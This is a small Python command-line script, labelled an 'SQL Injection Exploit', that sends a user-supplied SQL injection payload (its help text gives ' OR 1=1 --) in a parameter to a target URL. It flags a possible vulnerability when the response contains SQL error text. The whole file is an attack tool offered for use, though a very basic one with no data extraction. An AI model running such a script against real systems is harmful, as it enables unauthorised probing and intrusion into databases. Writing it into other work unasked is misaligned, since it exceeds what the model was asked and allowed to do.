import argparse
import requests
import logging


def sql_injection_attack(target_url, param, injection_payload):
    """
    Perform an SQL Injection attack.
    :param target_url: Target URL.
    :param param: Vulnerable parameter.
    :param injection_payload: SQL injection payload.
    """
    logging.info(f"Starting SQL Injection attack on {target_url} with parameter: {param}")
    try:
        response = requests.get(target_url, params={param: injection_payload}, timeout=5)
        if "SQL syntax" in response.text or "error" in response.text.lower():
            logging.info(f"Possible SQL injection vulnerability detected on {target_url}")
            return response.text
        else:
            logging.info(f"No vulnerability detected on {target_url}")
    except Exception as e:
        logging.error(f"Error during SQL Injection attack: {e}")

    return "SQL Injection attack failed."


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL Injection Exploit")
    parser.add_argument("--target", required=True, help="Target URL (e.g., http://example.com/vulnerable_endpoint)")
    parser.add_argument("--param", required=True, help="Vulnerable parameter name (e.g., id, username)")
    parser.add_argument("--payload", required=True, help="SQL injection payload (e.g., ' OR 1=1 --)")
    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO)
    result = sql_injection_attack(args.target, args.param, args.payload)
    print(result)
